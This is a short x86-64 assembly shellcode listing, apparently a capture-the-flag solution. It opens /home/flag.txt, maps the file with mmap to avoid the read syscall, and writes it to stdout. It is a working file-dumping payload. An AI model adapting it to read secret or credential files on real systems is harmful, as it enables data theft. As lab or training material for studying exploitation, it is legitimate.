section .text

global _start
_start:
mov     rax, 2          
mov     rbx, 'ag.txt'
push    0
push    rbx
mov     rbx, '/home/fl'
push    rbx

push    rsp
pop     rdi

xor     rsi, rsi        
syscall

mov     rdi, rax        
sub     rsp, 144        
mov     rsi, rsp        
mov     rax, 5          
syscall

mov     rsi, [rsp+48]   
add     rsp, 144        
mov     r8, rdi         
xor     rdi, rdi        
mov     rdx, 0x1        
mov     r10, 0x2        
xor     r9, r9          
mov     rax, 9          
syscall

mov     rdx, rsi        
mov     rsi, rax        
mov     rdi, 1          
mov     rax, 1          
syscall
